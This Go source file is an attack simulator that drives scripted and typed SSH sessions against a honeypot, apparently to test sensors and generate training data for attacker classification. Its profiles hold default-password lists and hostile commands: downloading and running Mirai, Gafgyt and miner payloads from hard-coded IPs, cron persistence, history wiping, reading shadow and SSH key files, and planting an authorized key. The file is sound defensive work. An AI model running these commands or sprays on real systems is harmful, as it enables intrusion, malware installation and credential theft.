// Command attacksim replays realistic attacker behaviour against a honeypot.
//
// Two jobs. First, it is the end-to-end test driver: it exercises the sensor
// and collector together with traffic shaped like the real thing. Second, it
// generates the training corpus -- clustering cannot be evaluated against three
// hand-typed sessions, and pointing a real sensor at the internet and waiting a
// week is a poor development loop.
//
// The profiles below are modelled on published behaviour of widely-documented
// malware families. Each differs in the dimensions the ML pipeline keys on:
// credential lists, command sequences, inter-command timing, and -- because
// each profile declares its own algorithm preferences -- HASSH fingerprint.
package main

import (
	"flag"
	"fmt"
	"math/rand"
	"os"
	"strings"
	"sync"
	"time"

	gossh "golang.org/x/crypto/ssh"
)

// Profile describes one attacker archetype.
type Profile struct {
	Name string
	// ClientVersion is the SSH banner. Real families use distinct libraries
	// and this is the cheapest observable difference.
	ClientVersion string
	// Crypto preferences shape the HASSH fingerprint, so two profiles using
	// different lists are distinguishable even when they spoof the same banner.
	KeyExchanges []string
	Ciphers      []string
	MACs         []string

	Usernames []string
	Passwords []string

	// Commands run once authenticated. Empty means a credential-only scan.
	Commands []string

	// Interactive drives a PTY session with per-keystroke timing; otherwise
	// the whole payload goes in a single exec request.
	Interactive bool

	// Timing between commands. Scripted families are fast and near-constant;
	// humans are slow and irregular.
	MinGap, MaxGap time.Duration
	// TypingSpeed is the mean inter-keystroke gap for interactive profiles.
	TypingSpeed time.Duration
}

var profiles = []Profile{
	{
		Name:          "mirai-loader",
		ClientVersion: "SSH-2.0-libssh2_1.4.3",
		KeyExchanges:  []string{"diffie-hellman-group14-sha1", "diffie-hellman-group1-sha1"},
		Ciphers:       []string{"aes128-ctr", "aes192-ctr", "aes256-ctr"},
		MACs:          []string{"hmac-sha1", "hmac-sha1-96"},
		Usernames:     []string{"root", "admin", "root"},
		Passwords:     []string{"xc3511", "vizxv", "admin", "123456", "root"},
		Commands: []string{
			"/bin/busybox ECCHI",
			"cat /proc/mounts; /bin/busybox ECCHI",
			"cd /tmp; wget http://185.244.25.171/bins/mirai.x86 -O dvrHelper; chmod 777 dvrHelper; ./dvrHelper telnet.x86",
			"rm -rf dvrHelper; /bin/busybox ECCHI",
		},
		MinGap: 40 * time.Millisecond, MaxGap: 180 * time.Millisecond,
	},
	{
		Name:          "gafgyt-tftp",
		ClientVersion: "SSH-2.0-libssh-0.6.3",
		KeyExchanges:  []string{"curve25519-sha256@libssh.org", "diffie-hellman-group14-sha1"},
		Ciphers:       []string{"aes256-ctr", "aes128-ctr"},
		MACs:          []string{"hmac-sha2-256", "hmac-sha1"},
		Usernames:     []string{"root", "supervisor", "ubnt"},
		Passwords:     []string{"root", "supervisor", "ubnt", "1234"},
		Commands: []string{
			"enable",
			"shell",
			"sh",
			"cat /proc/cpuinfo",
			"tftp -g -r bins.sh 91.92.240.18; chmod +x bins.sh; sh bins.sh",
			"rm -f bins.sh",
		},
		MinGap: 60 * time.Millisecond, MaxGap: 250 * time.Millisecond,
	},
	{
		Name:          "credential-scanner",
		ClientVersion: "SSH-2.0-Go",
		KeyExchanges:  []string{"curve25519-sha256", "ecdh-sha2-nistp256"},
		Ciphers:       []string{"chacha20-poly1305@openssh.com", "aes128-gcm@openssh.com"},
		MACs:          []string{"hmac-sha2-256-etm@openssh.com"},
		Usernames:     []string{"root", "admin", "test", "oracle", "postgres", "ubuntu", "git", "deploy"},
		Passwords:     []string{"123456", "password", "admin", "root", "toor", "P@ssw0rd", "qwerty", "letmein"},
		// No commands: this family only harvests which credentials work.
		Commands: nil,
		MinGap:   20 * time.Millisecond, MaxGap: 60 * time.Millisecond,
	},
	{
		Name:          "xmrig-dropper",
		ClientVersion: "SSH-2.0-paramiko_2.9.2",
		KeyExchanges:  []string{"ecdh-sha2-nistp256", "diffie-hellman-group14-sha256"},
		Ciphers:       []string{"aes128-ctr", "aes192-ctr", "aes256-ctr"},
		MACs:          []string{"hmac-sha2-256", "hmac-sha2-512"},
		Usernames:     []string{"root", "ubuntu"},
		Passwords:     []string{"123456", "password", "ubuntu", "root"},
		Commands: []string{
			"uname -a",
			"nproc",
			"cat /proc/cpuinfo | grep 'model name' | head -1",
			"free -m",
			"id",
			"crontab -l",
			"curl -s http://45.9.148.37/setup.sh -o /tmp/.x || wget -q http://45.9.148.37/setup.sh -O /tmp/.x",
			"chmod +x /tmp/.x",
			"nohup /tmp/.x > /dev/null 2>&1 &",
			"echo '*/10 * * * * /tmp/.x' > /var/spool/cron/crontabs/root",
			"history -c",
		},
		MinGap: 150 * time.Millisecond, MaxGap: 700 * time.Millisecond,
	},
	{
		Name:          "human-operator",
		ClientVersion: "SSH-2.0-OpenSSH_9.6",
		KeyExchanges:  []string{"curve25519-sha256", "curve25519-sha256@libssh.org", "ecdh-sha2-nistp256"},
		Ciphers:       []string{"chacha20-poly1305@openssh.com", "aes256-gcm@openssh.com", "aes128-ctr"},
		MACs:          []string{"umac-64-etm@openssh.com", "hmac-sha2-256-etm@openssh.com"},
		Usernames:     []string{"root"},
		Passwords:     []string{"admin", "root"},
		Commands: []string{
			"whoami",
			"id",
			"uname -a",
			"ls -la",
			"cd /var/www",
			"ls",
			"cat /etc/passwd",
			"ps aux",
			"netstat -an",
			"cat /etc/shadow",
			"find / -name '*.pem' 2>/dev/null",
			"df -h",
			"w",
		},
		Interactive: true,
		// An order of magnitude slower than any script, with wide variance.
		// This gap is what the bot/human classifier separates on.
		MinGap: 1200 * time.Millisecond, MaxGap: 6000 * time.Millisecond,
		TypingSpeed: 120 * time.Millisecond,
	},
	{
		Name:          "ssh-worm",
		ClientVersion: "SSH-2.0-libssh2_1.9.0",
		KeyExchanges:  []string{"diffie-hellman-group-exchange-sha256", "diffie-hellman-group14-sha1"},
		Ciphers:       []string{"aes128-ctr", "3des-cbc"},
		MACs:          []string{"hmac-sha1"},
		Usernames:     []string{"root", "deploy", "jenkins"},
		Passwords:     []string{"root", "deploy", "jenkins", "changeme"},
		Commands: []string{
			"cat ~/.ssh/id_rsa",
			"cat ~/.ssh/known_hosts",
			"cat ~/.ssh/authorized_keys",
			"echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vbqajDhA attacker@host' >> ~/.ssh/authorized_keys",
			"cat /etc/passwd | cut -d: -f1",
			"last -20",
		},
		MinGap: 80 * time.Millisecond, MaxGap: 300 * time.Millisecond,
	},
}

func main() {
	var (
		addr     = flag.String("addr", "127.0.0.1:2222", "honeypot ssh address")
		runs     = flag.Int("runs", 1, "sessions per profile")
		only     = flag.String("profile", "", "run only this profile")
		parallel = flag.Int("parallel", 1, "concurrent sessions")
		list     = flag.Bool("list", false, "list profiles and exit")
		seed     = flag.Int64("seed", time.Now().UnixNano(), "rng seed for reproducible corpora")
	)
	flag.Parse()

	if *list {
		for _, p := range profiles {
			kind := "scripted"
			if p.Interactive {
				kind = "interactive"
			}
			fmt.Printf("%-20s %-12s %2d commands  %s\n", p.Name, kind, len(p.Commands), p.ClientVersion)
		}
		return
	}

	selected := profiles
	if *only != "" {
		selected = nil
		for _, p := range profiles {
			if p.Name == *only {
				selected = append(selected, p)
			}
		}
		if len(selected) == 0 {
			fmt.Fprintf(os.Stderr, "unknown profile %q\n", *only)
			os.Exit(2)
		}
	}

	rng := rand.New(rand.NewSource(*seed)) //nolint:gosec // corpus reproducibility, not security
	sem := make(chan struct{}, *parallel)
	var wg sync.WaitGroup
	var mu sync.Mutex
	ok, failed := 0, 0

	start := time.Now()
	for run := 0; run < *runs; run++ {
		for _, p := range selected {
			wg.Add(1)
			sem <- struct{}{}
			go func(p Profile, r int) {
				defer wg.Done()
				defer func() { <-sem }()

				mu.Lock()
				sessionSeed := rng.Int63()
				mu.Unlock()

				err := runSession(*addr, p, rand.New(rand.NewSource(sessionSeed))) //nolint:gosec
				mu.Lock()
				if err != nil {
					failed++
					fmt.Printf("  %-20s run %-3d FAILED: %v\n", p.Name, r, err)
				} else {
					ok++
					fmt.Printf("  %-20s run %-3d ok\n", p.Name, r)
				}
				mu.Unlock()
			}(p, run)
		}
	}
	wg.Wait()

	fmt.Printf("\n%d sessions ok, %d failed, in %s (seed %d)\n",
		ok, failed, time.Since(start).Round(time.Millisecond), *seed)
	if failed > 0 {
		os.Exit(1)
	}
}

// runSession performs one full attacker session: credential spray, then either
// an exec payload or an interactive command sequence.
func runSession(addr string, p Profile, rng *rand.Rand) error {
	user := p.Usernames[rng.Intn(len(p.Usernames))]

	attempt := 0
	cfg := &gossh.ClientConfig{
		User:          user,
		ClientVersion: p.ClientVersion,
		Config: gossh.Config{
			KeyExchanges: p.KeyExchanges,
			Ciphers:      p.Ciphers,
			MACs:         p.MACs,
		},
		Auth: []gossh.AuthMethod{
			gossh.RetryableAuthMethod(gossh.PasswordCallback(func() (string, error) {
				pw := p.Passwords[attempt%len(p.Passwords)]
				attempt++
				// Credential sprays have a characteristic near-constant rate.
				time.Sleep(jitter(rng, p.MinGap, p.MaxGap))
				return pw, nil
			}), len(p.Passwords)+4),
		},
		HostKeyCallback: gossh.InsecureIgnoreHostKey(), //nolint:gosec // deliberately connecting to a honeypot
		Timeout:         15 * time.Second,
	}

	client, err := gossh.Dial("tcp", addr, cfg)
	if err != nil {
		return fmt.Errorf("dial: %w", err)
	}
	defer func() { _ = client.Close() }()

	if len(p.Commands) == 0 {
		// Credential-only scan: authenticate and leave without opening a shell.
		return nil
	}

	if p.Interactive {
		return runInteractive(client, p, rng)
	}
	return runExec(client, p, rng)
}

// runExec issues each command as its own exec request, the way scripted
// loaders do.
func runExec(client *gossh.Client, p Profile, rng *rand.Rand) error {
	for _, cmd := range p.Commands {
		sess, err := client.NewSession()
		if err != nil {
			return fmt.Errorf("new session: %w", err)
		}
		_, err = sess.CombinedOutput(cmd)
		_ = sess.Close()
		if err != nil {
			// A non-zero exit is normal -- `false`, missing files, denied
			// permissions all happen -- and must not abort the run.
			var exitErr *gossh.ExitError
			if !asExitError(err, &exitErr) {
				return fmt.Errorf("exec %q: %w", cmd, err)
			}
		}
		time.Sleep(jitter(rng, p.MinGap, p.MaxGap))
	}
	return nil
}

// runInteractive drives a PTY, typing character by character so the sensor
// records realistic per-keystroke timing.
func runInteractive(client *gossh.Client, p Profile, rng *rand.Rand) error {
	sess, err := client.NewSession()
	if err != nil {
		return fmt.Errorf("new session: %w", err)
	}
	defer func() { _ = sess.Close() }()

	if err := sess.RequestPty("xterm-256color", 40, 120, gossh.TerminalModes{
		gossh.ECHO:          1,
		gossh.TTY_OP_ISPEED: 14400,
		gossh.TTY_OP_OSPEED: 14400,
	}); err != nil {
		return fmt.Errorf("request pty: %w", err)
	}

	stdin, err := sess.StdinPipe()
	if err != nil {
		return fmt.Errorf("stdin pipe: %w", err)
	}
	stdout, err := sess.StdoutPipe()
	if err != nil {
		return fmt.Errorf("stdout pipe: %w", err)
	}

	if err := sess.Shell(); err != nil {
		return fmt.Errorf("start shell: %w", err)
	}

	// Drain output so the sensor's writes never block on a full window.
	done := make(chan struct{})
	go func() {
		defer close(done)
		buf := make([]byte, 4096)
		for {
			if _, err := stdout.Read(buf); err != nil {
				return
			}
		}
	}()

	time.Sleep(jitter(rng, p.MinGap, p.MaxGap))

	for _, cmd := range p.Commands {
		if err := typeLine(stdin, cmd, p.TypingSpeed, rng); err != nil {
			break
		}
		time.Sleep(jitter(rng, p.MinGap, p.MaxGap))
	}

	_ = typeLine(stdin, "exit", p.TypingSpeed, rng)
	_ = stdin.Close()

	select {
	case <-done:
	case <-time.After(5 * time.Second):
	}
	return nil
}

// typeLine sends a command one character at a time with human-shaped gaps.
//
// The gap distribution is the point. Real typing is roughly lognormal with
// pronounced pauses at word boundaries; a script writes the whole line in one
// syscall. That difference is nearly linearly separable and is what the
// bot/human classifier is built on, so the simulator has to reproduce it
// faithfully or the classifier gets evaluated against a fiction.
func typeLine(w interface{ Write([]byte) (int, error) }, line string, speed time.Duration, rng *rand.Rand) error {
	if speed <= 0 {
		speed = 100 * time.Millisecond
	}
	for i, ch := range line {
		if _, err := w.Write([]byte(string(ch))); err != nil {
			return err
		}

		// Lognormal-ish: most gaps near the mean, occasional long pauses.
		gap := time.Duration(rng.NormFloat64()*float64(speed)/3 + float64(speed))
		if gap < 15*time.Millisecond {
			gap = 15 * time.Millisecond
		}
		// Thinking pause before a word.
		if i > 0 && line[i-1] == ' ' && rng.Float64() < 0.3 {
			gap += time.Duration(rng.Intn(400)) * time.Millisecond
		}
		time.Sleep(gap)
	}
	_, err := w.Write([]byte("\r"))
	return err
}

func jitter(rng *rand.Rand, minGap, maxGap time.Duration) time.Duration {
	if maxGap <= minGap {
		return minGap
	}
	return minGap + time.Duration(rng.Int63n(int64(maxGap-minGap)))
}

func asExitError(err error, target **gossh.ExitError) bool {
	for err != nil {
		if e, ok := err.(*gossh.ExitError); ok {
			*target = e
			return true
		}
		u, ok := err.(interface{ Unwrap() error })
		if !ok {
			return strings.Contains(err.Error(), "exited with status")
		}
		err = u.Unwrap()
	}
	return false
}
